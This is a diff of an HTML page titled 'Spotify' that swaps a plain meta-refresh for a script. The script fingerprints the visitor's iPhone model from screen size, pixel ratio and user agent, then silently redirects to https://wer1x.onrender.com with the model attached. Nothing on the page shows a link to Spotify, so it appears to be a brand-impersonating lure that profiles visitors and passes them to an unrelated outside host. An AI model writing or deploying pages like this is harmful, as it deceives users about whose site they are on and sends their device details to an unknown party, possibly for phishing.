@@ -4,7 +4,26 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Spotify</title>
-  <meta http-equiv="refresh" content="0; url=https://wer1x.onrender.com">
 </head>
-<body></body>
+<body>
+  <script>
+    let device = '';
+    let w = screen.width;
+    let h = screen.height;
+    let dpr = window.devicePixelRatio || 1;
+    if (/iPhone/.test(navigator.userAgent) || (/Mac/.test(navigator.userAgent) && 'ontouchend' in document)) {
+      const models = {
+        '320x568x2':'iPhone SE','375x667x2':'iPhone 6/7/8/SE2','414x736x3':'iPhone 6+/7+/8+',
+        '375x812x3':'iPhone X/XS/11 Pro/12 mini/13 mini','414x896x2':'iPhone XR/11','414x896x3':'iPhone XS Max/11 Pro Max',
+        '390x844x3':'iPhone 12/13/14','428x926x3':'iPhone 12 Pro Max/13 Pro Max/14 Plus',
+        '393x852x3':'iPhone 14 Pro/15/15 Pro/16','430x932x3':'iPhone 14 Pro Max/15 Pro Max/16 Pro Max',
+        '360x780x3':'iPhone 16e'
+      };
+      device = models[w+'x'+h+'x'+dpr] || '';
+    }
+    let url = 'https://wer1x.onrender.com';
+    if (device) url += '?device=' + encodeURIComponent(device);
+    window.location.replace(url);
+  </script>
+</body>
 </html>
